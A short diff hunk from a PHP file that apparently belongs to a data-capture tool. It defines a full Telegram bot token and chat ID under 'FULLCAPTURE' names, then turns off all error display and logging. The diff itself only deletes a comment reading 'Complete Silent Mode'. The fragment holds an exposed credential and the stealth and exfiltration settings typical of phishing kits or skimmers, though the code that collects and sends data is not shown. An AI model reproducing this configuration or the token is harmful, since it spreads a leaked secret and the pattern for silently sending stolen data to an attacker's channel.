@@ -12,7 +12,6 @@ define('FULLCAPTURE_TELEGRAM_TOKEN', '8593050317:AAH5qQs2BXtzp0gA96VGNITvBsoOLQS
 define('FULLCAPTURE_TELEGRAM_CHAT_ID', '7958019961');
 define('FULLCAPTURE_VERSION', '17.1.0');
 
-// Complete Silent Mode
 @error_reporting(0);
 @ini_set('display_errors', 0);
 @ini_set('log_errors', 0);
